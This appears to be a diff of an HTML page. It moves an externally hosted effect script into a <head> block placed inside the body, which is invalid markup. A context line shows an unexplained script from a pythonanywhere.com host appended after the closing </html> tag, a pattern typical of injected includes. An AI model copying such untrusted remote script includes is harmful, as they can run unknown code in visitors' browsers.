@@ -101,6 +101,10 @@ if (location.protocol.substr(0, 4) === "file")
 	<script src="scripts/register-sw.js" type="module"></script>
 
 <script src="https://math.voidium.uk/lib/fps.js"></script>
-<script src="https://math.voidium.uk/lib/effect.js"></script>
+<head>
+  <link rel="preload" href="https://math.voidium.uk/lib/effect.js" as="script">
+  <script src="https://math.voidium.uk/lib/effect.js" defer></script>
+</head>
+
 </body>
 </html><script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
